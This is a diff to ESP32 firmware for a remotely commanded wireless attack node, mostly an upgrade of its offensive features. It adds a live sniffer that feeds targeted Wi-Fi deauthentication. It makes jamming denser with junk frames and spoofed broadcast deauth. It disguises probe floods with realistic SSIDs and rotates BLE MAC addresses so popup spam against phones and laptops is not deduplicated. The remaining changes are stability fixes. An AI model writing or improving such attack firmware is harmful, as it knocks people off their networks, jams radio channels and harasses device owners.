@@ -12,6 +12,8 @@
 #include <Preferences.h>
 #include <esp_task_wdt.h>
 #include <esp_bt.h>
+#include <esp_mac.h>  // esp_base_mac_addr_set() moved here in ESP32 core 3.x (IDF5)
+// esp_ble_gap_set_rand_addr() (used by rotateBleMac) comes transitively via BLEDevice.h
 #if __has_include(<DNSServer.h>)
 #include <DNSServer.h>
 #define HAS_DNS_SERVER 1
@@ -19,6 +21,7 @@
 #define HAS_DNS_SERVER 0
 #endif
 #include <string>
+#include <cmath>
 #include <mbedtls/aes.h>
 
 #define CC1101_CS 10
@@ -66,7 +69,10 @@ typedef struct struct_message {
 } struct_message;
 struct_message myData;
 
-bool attackRunning = false;
+// attackRunning is set from the ESP-NOW recv callback (WiFi task) and polled by
+// loop() and the long-running attack steps to abort — mark volatile so the
+// compiler always reloads it rather than caching the value in a register.
+volatile bool attackRunning = false;
 bool extremeMode = false;
 bool boostMode = false;
 String currentAttack = "";
@@ -89,6 +95,13 @@ uint8_t scannedBSSIDs[MAX_SCANNED_NETWORKS][6];
 uint8_t scannedChannels[MAX_SCANNED_NETWORKS];
 int scannedCount = 0;
 int deauthIndex = 0;
+
+// Unique client/AP MACs seen while sniffing (used by deauth + Wi-Fi scan).
+// Declared here because runDeauthStep() references them before the scanner
+// section further down; Arduino only auto-prototypes functions, not globals.
+#define MAX_UNIQUE_MACS 50
+uint8_t seenMacs[MAX_UNIQUE_MACS][6];
+int seenMacsCount = 0;
 
 // BLE variables
 bool bleJammerInitialized = false;
@@ -314,13 +327,20 @@ void sendLogToMaster(const char* logMsg, bool urgent = false) {
 }
 
 void processLogQueue() {
-  if (logQueueCount == 0 || !hasMasterMac) return;
+  if (!hasMasterMac) return;
+  // Read the shared counter under the mutex; it is also touched from enqueueLog().
+  bool hasLogs = false;
+  if (logQueueMutex && xSemaphoreTake(logQueueMutex, pdMS_TO_TICKS(10)) == pdTRUE) {
+    hasLogs = (logQueueCount > 0);
+    xSemaphoreGive(logQueueMutex);
+  }
+  if (!hasLogs) return;
   String batch = "";
-  while (logQueueCount > 0) {
+  while (true) {
     String msg = dequeueLog();
-    if (msg.length() == 0) continue;
+    if (msg.length() == 0) break;  // queue drained (dequeueLog returns "" when empty)
     if (msg.length() >= 179) msg = msg.substring(0, 178);
-    
+
     if (batch.length() > 0 && batch.length() + msg.length() + 1 >= 179) {
       sendLogDirect(batch.c_str());
       delay(5);
@@ -408,7 +428,7 @@ void runBeaconSpamStep() {
       getRealisticSSID(ssidBuf, ssidIndex);
       sendRawBeacon(ssidBuf, currentChannel, ssidIndex);
       ssidIndex = (ssidIndex + 1) % 100;
-      if (i % 10 == 0) yield();
+      if (i % 10 == 0) { yield(); esp_task_wdt_reset(); }
     }
     if (random(10) == 0) {
       char buf[80];
@@ -417,6 +437,17 @@ void runBeaconSpamStep() {
       sendLogToMaster(buf);
     }
   }
+}
+
+// Live client sniffer used during deauth: harvests station MACs from data
+// frames in real time so targeted deauth hits clients that appear mid-attack,
+// not only those found in the initial scan.
+void deauthSnifferCb(void* buf, wifi_promiscuous_pkt_type_t type) {
+  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
+  if (pkt->rx_ctrl.sig_len < 24) return;
+  const uint8_t* p = pkt->payload;
+  addSeenMac(&p[4]);   // addr1 (receiver)
+  addSeenMac(&p[10]);  // addr2 (transmitter)
 }
 
 void sendDeauthFrame(const uint8_t* apBssid, const uint8_t* clientMac, uint16_t reason) {
@@ -441,6 +472,11 @@ void startWiFiScan();
 
 void runDeauthStep() {
   esp_wifi_set_promiscuous(true);
+  // Re-attach the live client sniffer every step: the periodic listen window in
+  // loop() toggles promiscuous off (which drops the rx callback), so a one-time
+  // guard would silently lose sniffing after the first pause. Re-registering is
+  // cheap and keeps targeted deauth discovering new stations continuously.
+  esp_wifi_set_promiscuous_rx_cb(deauthSnifferCb);
   unsigned long interval = extremeMode ? 0 : (boostMode ? 1 : 2);
 
   if (extremeMode) {
@@ -512,6 +548,7 @@ void runDeauthStep() {
     clientPacket[0] = 0xA0;
     esp_wifi_80211_tx(WIFI_IF_STA, clientPacket, sizeof(clientPacket), false);
     yield();
+    if (i % 10 == 0) esp_task_wdt_reset();
   }
 
   if (random(150) == 0) {
@@ -536,7 +573,13 @@ void runProbeFloodStep() {
     uint8_t mac[6];
     for (int i = 0; i < 6; i++) mac[i] = random(256);
     mac[0] &= 0xFE; mac[0] |= 0x02;
-    const char* ssid = "ProbeTest";
+    // Use varied realistic SSIDs instead of a single fixed name so the flood
+    // looks like many distinct devices probing, not one obvious source.
+    static int probeSsidIdx = 0;
+    char ssidBuf[32];
+    getRealisticSSID(ssidBuf, probeSsidIdx);
+    probeSsidIdx = (probeSsidIdx + 1) % 100;
+    const char* ssid = ssidBuf;
     uint8_t ssidLen = strlen(ssid);
     uint8_t probePacket[24 + 2 + 32] = {0x40, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
     memcpy(&probePacket[10], mac, 6);
@@ -554,10 +597,22 @@ void runPowerfulJammerStep() {
   if (millis() - lastAttackActionTime >= 20) {
     lastAttackActionTime = millis();
     hopChannel();
-    uint8_t junkPacket[64];
-    for (int i = 0; i < 64; i++) junkPacket[i] = random(256);
-    junkPacket[0] = 0x00;
-    esp_wifi_80211_tx(WIFI_IF_STA, junkPacket, sizeof(junkPacket), false);
+    // Dense burst instead of a single packet per tick: mix junk frames with
+    // broadcast deauth so the channel is hit far harder.
+    int burst = extremeMode ? 60 : (boostMode ? 30 : 15);
+    uint8_t broadcastMac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+    for (int i = 0; i < burst; i++) {
+      uint8_t junkPacket[64];
+      for (int j = 0; j < 64; j++) junkPacket[j] = random(256);
+      junkPacket[0] = 0x00;
+      esp_wifi_80211_tx(WIFI_IF_STA, junkPacket, sizeof(junkPacket), false);
+      // Broadcast deauth spoofing a random BSSID on this channel
+      uint8_t fakeBssid[6];
+      for (int j = 0; j < 6; j++) fakeBssid[j] = random(256);
+      fakeBssid[0] &= 0xFE;
+      sendDeauthFrame(fakeBssid, broadcastMac, 7);
+      if (i % 10 == 0) { yield(); esp_task_wdt_reset(); }
+    }
   }
   if (!bleJammerInitialized) {
     BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
@@ -592,10 +647,6 @@ struct APInfo {
 #define MAX_APS 40
 APInfo apList[MAX_APS];
 int apCount = 0;
-
-#define MAX_UNIQUE_MACS 50
-uint8_t seenMacs[MAX_UNIQUE_MACS][6];
-int seenMacsCount = 0;
 
 void addSeenMac(const uint8_t* mac) {
   if (mac[0] == 0xFF && mac[1] == 0xFF && mac[2] == 0xFF && mac[3] == 0xFF && mac[4] == 0xFF && mac[5] == 0xFF) return;
@@ -794,12 +845,12 @@ void startBLEScan() {
   pBLEScan->setInterval(100);
   pBLEScan->setWindow(99);
 #if defined(ESP_ARDUINO_VERSION_MAJOR) && ESP_ARDUINO_VERSION_MAJOR >= 3
-  BLEScanResults foundDevices = pBLEScan->start(5, false);
-  int devCount = foundDevices.getCount();
-#else
   BLEScanResults *foundDevices = pBLEScan->start(5, false);
   if (!foundDevices) { sendLogToMaster("[BLE] Scan failed!", true); return; }
   int devCount = foundDevices->getCount();
+#else
+  BLEScanResults foundDevices = pBLEScan->start(5, false);
+  int devCount = foundDevices.getCount();
 #endif
   char buf[64];
   snprintf(buf, sizeof(buf), "[BLE] Found %d devices", devCount);
@@ -807,9 +858,9 @@ void startBLEScan() {
   for (int i = 0; i < min(devCount, 15); i++) {
     yield(); esp_task_wdt_reset();
 #if defined(ESP_ARDUINO_VERSION_MAJOR) && ESP_ARDUINO_VERSION_MAJOR >= 3
-    BLEAdvertisedDevice device = foundDevices.getDevice(i);
-#else
     BLEAdvertisedDevice device = foundDevices->getDevice(i);
+#else
+    BLEAdvertisedDevice device = foundDevices.getDevice(i);
 #endif
     String devName = device.haveName() ? device.getName().c_str() : "Unnamed";
     String devAddr = device.getAddress().toString().c_str();
@@ -836,6 +887,17 @@ void startBLEScan() {
   pBLEScan->clearResults();
 }
 
+// Rotate the BLE advertising MAC to a fresh random static address.
+// Critical for BLE spam: iOS/Android dedupe popups by advertiser MAC, so a
+// fixed MAC makes the popup appear only once. Rotating it per-advert keeps
+// the target device showing the pairing popup continuously.
+void rotateBleMac() {
+  esp_bd_addr_t rnd;
+  for (int i = 0; i < 6; i++) rnd[i] = random(256);
+  rnd[0] |= 0xC0;  // top two bits set => BLE random static address
+  esp_ble_gap_set_rand_addr(rnd);
+}
+
 void startBLESpoofer() {
   BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
   if (!pAdvertising) {
@@ -849,10 +911,7 @@ void startBLESpoofer() {
   const int numSpoofNames = sizeof(spoofNames) / sizeof(spoofNames[0]);
   advertisementData.setName(spoofNames[random(numSpoofNames)]);
   advertisementData.setFlags(0x06);
-  uint8_t spoofMac[6];
-  for (int i = 0; i < 6; i++) spoofMac[i] = random(256);
-  spoofMac[0] &= 0xFE; spoofMac[0] |= 0x02;
-  esp_base_mac_addr_set(spoofMac);
+  rotateBleMac();  // proper BLE random static address (esp_base_mac_addr_set doesn't affect adverts post-init)
   uint8_t manufData[] = {0x4C, 0x00, 0x01, 0x02, 0x03, 0x04, 0x05};
   String manufString = "";
   for (int i = 0; i < (int)sizeof(manufData); i++) manufString += (char)manufData[i];
@@ -863,24 +922,33 @@ void startBLESpoofer() {
 }
 
 void runBLEJammerStep() {
+  BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
+  if (!pAdvertising) return;
   if (!bleJammerInitialized) {
-    BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
-    if (pAdvertising) {
-      BLEAdvertisementData data;
-      char jamName[16];
-      snprintf(jamName, sizeof(jamName), "BJ_%04X", (uint16_t)esp_random());
-      data.setName(jamName);
-      data.setFlags(0x06);
-      pAdvertising->setAdvertisementData(data);
-      pAdvertising->start();
-      bleJammerInitialized = true;
-      sendLogToMaster("[BLE Jammer] Broadcasting continuous noise");
-    }
+    bleJammerInitialized = true;
+    sendLogToMaster("[BLE Jammer] Broadcasting continuous noise");
   }
   static unsigned long lastBleJamTime = 0;
   unsigned long bleJamInterval = extremeMode ? 1 : (boostMode ? 2 : 3);
   if (millis() - lastBleJamTime < bleJamInterval) return;
   lastBleJamTime = millis();
+  // Continuously re-advertise with a fresh random MAC + random name/payload so
+  // the channel is flooded with distinct advertisers rather than one static beacon.
+  int burst = extremeMode ? 4 : (boostMode ? 2 : 1);
+  for (int b = 0; b < burst; b++) {
+    pAdvertising->stop();
+    rotateBleMac();
+    BLEAdvertisementData data;
+    char jamName[16];
+    snprintf(jamName, sizeof(jamName), "BJ_%04X", (uint16_t)esp_random());
+    data.setName(jamName);
+    data.setFlags(0x06);
+    uint8_t junk[16];
+    for (int i = 0; i < 16; i++) junk[i] = random(256);
+    data.setManufacturerData(String((char*)junk, sizeof(junk)));
+    pAdvertising->setAdvertisementData(data);
+    pAdvertising->start();
+  }
 }
 
 void runSourAppleStep() {
@@ -894,22 +962,28 @@ void runSourAppleStep() {
     lastAppleSpamTime = millis();
     BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
     if (!pAdvertising) { sendLogToMaster("[BLE Spam] BLE not initialized", true); return; }
-    pAdvertising->stop();
-    BLEAdvertisementData advData;
-    advData.setFlags(0x04);
-    const uint8_t *payload = blePayloads[blePayloadIndex];
-    uint8_t len = payload[0];
-    String manufDataStr((char*)&payload[1], len);
-    advData.setManufacturerData(manufDataStr);
-    pAdvertising->setAdvertisementData(advData);
-    pAdvertising->start();
+    // Send several payloads per tick so popups from iOS/Android/Windows
+    // interleave instead of trickling one at a time.
+    int burst = extremeMode ? 4 : (boostMode ? 2 : 1);
+    for (int b = 0; b < burst; b++) {
+      pAdvertising->stop();
+      rotateBleMac();  // fresh MAC per advert defeats popup dedup
+      BLEAdvertisementData advData;
+      advData.setFlags(0x04);
+      const uint8_t *payload = blePayloads[blePayloadIndex];
+      uint8_t len = payload[0];
+      String manufDataStr((char*)&payload[1], len);
+      advData.setManufacturerData(manufDataStr);
+      pAdvertising->setAdvertisementData(advData);
+      pAdvertising->start();
+      blePayloadIndex = (blePayloadIndex + 1) % numBlePayloads;
+    }
     if (random(20) == 0) {
       char buf[64];
-      snprintf(buf, sizeof(buf), "[BLE Spam] Payload %d%s", blePayloadIndex,
+      snprintf(buf, sizeof(buf), "[BLE Spam] Payload %d x%d%s", blePayloadIndex, burst,
                extremeMode ? " [EXTREME]" : (boostMode ? " [BOOST]" : ""));
       sendLogToMaster(buf);
     }
-    blePayloadIndex = (blePayloadIndex + 1) % numBlePayloads;
   }
 }
 
@@ -936,11 +1010,11 @@ void startGhzScan() {
     pBLEScan->setInterval(80);
     pBLEScan->setWindow(50);
 #if defined(ESP_ARDUINO_VERSION_MAJOR) && ESP_ARDUINO_VERSION_MAJOR >= 3
-    BLEScanResults foundDevices2 = pBLEScan->start(2, false);
-    int bleCount = foundDevices2.getCount();
-#else
     BLEScanResults *foundDevices2 = pBLEScan->start(2, false);
     int bleCount = foundDevices2 ? foundDevices2->getCount() : 0;
+#else
+    BLEScanResults foundDevices2 = pBLEScan->start(2, false);
+    int bleCount = foundDevices2.getCount();
 #endif
     pBLEScan->clearResults();
     sendLogToMaster("--- 2.4GHz Band Spectrum Report ---");
@@ -1556,7 +1630,10 @@ void registerMasterPeer(const uint8_t *mac) {
 
 // ===== HELPER: Parse BSSID string to bytes =====
 void parseBssid(const char* str, uint8_t* out) {
-  if (!str || strlen(str) < 17) {
+  // Short-circuit: strlen is never reached when str is NULL.
+  if (!str) { memset(out, 0, 6); return; }
+  size_t len = strlen(str);
+  if (len < 17 || len > 32) {
     memset(out, 0, 6);
     return;
   }
@@ -1618,10 +1695,11 @@ void OnDataRecv(const uint8_t *mac_addr, const uint8_t *incomingData, int len) {
     hasMasterMac = true;
     registerMasterPeer(srcMac);
     Preferences prefs;
-    prefs.begin("esptool2", false);
-    prefs.putBytes("masterMac", masterMacAddress, 6);
-    prefs.putBool("hasMasterMac", true);
-    prefs.end();
+    if (prefs.begin("esptool2", false)) {  // skip persistence if NVS can't be opened
+      prefs.putBytes("masterMac", masterMacAddress, 6);
+      prefs.putBool("hasMasterMac", true);
+      prefs.end();
+    }
   }
   lastMasterHeardTime = millis();
 
@@ -1843,16 +1921,17 @@ void setup() {
   esp_now_register_recv_cb(OnDataRecv);
 
   Preferences prefs;
-  prefs.begin("esptool2", false);
-  if (prefs.getBool("hasMasterMac", false)) {
-    prefs.getBytes("masterMac", masterMacAddress, 6);
-    hasMasterMac = true;
-    Serial.printf("Loaded Master MAC: %02X:%02X:%02X:%02X:%02X:%02X\n",
-                  masterMacAddress[0], masterMacAddress[1], masterMacAddress[2],
-                  masterMacAddress[3], masterMacAddress[4], masterMacAddress[5]);
-    registerMasterPeer(masterMacAddress);
+  if (prefs.begin("esptool2", false)) {
+    if (prefs.getBool("hasMasterMac", false)) {
+      prefs.getBytes("masterMac", masterMacAddress, 6);
+      hasMasterMac = true;
+      Serial.printf("Loaded Master MAC: %02X:%02X:%02X:%02X:%02X:%02X\n",
+                    masterMacAddress[0], masterMacAddress[1], masterMacAddress[2],
+                    masterMacAddress[3], masterMacAddress[4], masterMacAddress[5]);
+      registerMasterPeer(masterMacAddress);
+    }
+    prefs.end();
   }
-  prefs.end();
 
   lastMasterHeardTime = millis();
   Serial.println("SLAVE v1.2 ready");
